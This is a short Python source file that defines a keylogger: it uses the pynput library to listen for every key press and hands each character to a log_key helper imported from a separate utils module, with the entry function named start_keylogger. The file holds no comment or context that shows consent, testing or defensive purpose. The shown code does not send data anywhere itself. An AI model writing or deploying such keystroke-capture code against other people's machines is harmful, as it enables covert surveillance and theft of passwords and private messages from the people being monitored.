from pynput import keyboard
from utils import log_key

def on_press(key):
    try:
        log_key(key.char)
    except:
        log_key(str(key))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
